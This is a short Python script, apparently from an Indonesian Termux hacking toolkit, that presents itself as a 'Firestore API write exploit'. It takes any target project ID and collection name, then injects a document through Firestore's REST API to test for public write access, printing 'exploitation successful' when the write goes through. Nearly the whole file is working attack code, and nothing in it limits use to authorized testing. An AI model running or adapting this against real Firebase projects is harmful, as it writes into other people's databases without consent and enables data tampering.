# script/firebase_fs.py
import requests
import json
import time

def firestore_write_exploit(C):
    """
    Melakukan serangan Injeksi Data POST langsung ke Firestore API
    untuk menguji Public Write Access pada koleksi tertentu.
    """
    print(C["MENU"] + "\n--- FIRESTORE API WRITE EXPLOIT ---" + C["RESET"])

    # Meminta input
    print(C["INPUT"] + "Masukkan Project ID Firestore Target: " + C["RESET"], end="")
    project_id = input()

    print(C["INPUT"] + "Masukkan Nama Collection Target: " + C["RESET"], end="")
    collection_name = input()

    # URL Firestore REST API
    base_url = "https://firestore.googleapis.com/v1/projects"
    url = f"{base_url}/{project_id}/databases/(default)/documents/{collection_name}"

    # Payload injeksi data untuk membuktikan Public Write Access
    current_time = int(time.time())

    payload_data = {
        "fields": {
            "author": {"stringValue": "TEST-INJECTED-DATA-POC"},
            "message": {"stringValue": "Public Write Access Confirmed on Firestore!"},
            "timestamp": {"integerValue": current_time}
        }
    }

    print(C["MENU"] + f"\n[INFO] Target URL: {url}")
    print(C["MENU"] + "[INFO] Mengirim Payload untuk menguji Public Write Access...")

    try:
        response = requests.post(
            url,
            headers={'Content-Type': 'application/json'},
            data=json.dumps(payload_data)
        )

        # Analisis Respon
        if response.status_code == 200:
            print(C["SUCCESS"] + "\n✅ EKSPLOITASI BERHASIL!")
            print(f"   Status: {response.status_code} OK")
            print(f"   JSON Response (Dokumen Baru Dibuat): {response.text}")
            print(C["SUCCESS"] + "\n   ACTION: Periksa Firebase Konsol target. Dokumen baru telah ditambahkan.")
        elif response.status_code == 403:
            print(C["ERROR"] + f"\n❌ EKSPLOITASI GAGAL (Akses Ditolak). Status: {response.status_code}")
            print(C["MENU"] + "   INFO: Firestore Security Rules diatur dengan benar.")
        else:
            print(C["ERROR"] + f"\n⚠️ PERINGATAN: Status tidak terduga: {response.status_code}")
            print(C["ERROR"] + f"   Respon Penuh: {response.text}")

    except requests.exceptions.RequestException as e:
        print(C["ERROR"] + "\n❌ ERROR KONEKSI: Pastikan Project ID dan koneksi internet valid.")
        print(C["ERROR"] + f"   Detail: {e}")

# Di lingkungan Termux, pastikan Anda telah menginstal: pip install requests
